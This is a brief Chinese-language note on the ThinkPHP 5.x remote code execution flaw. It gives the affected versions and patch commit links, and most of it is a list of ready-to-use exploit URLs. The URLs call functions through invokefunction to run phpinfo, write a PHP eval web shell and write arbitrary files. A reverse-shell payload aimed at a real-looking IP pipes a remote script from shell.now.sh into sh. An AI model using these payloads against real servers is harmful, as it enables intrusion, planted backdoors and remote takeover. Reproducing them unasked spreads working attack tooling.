## 5.x RCE
https://learnku.com/articles/21227  
范围： 5.x < 5.1.31, <= 5.0.23  
补丁：https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f  
https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815  
payload: 
```
http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php

http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
shell反弹：
http://121.12.172.119:30022//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=curl+https%3A%2F%2Fshell.now.sh%2F154.223.145.173%3A1337+%7C+sh

```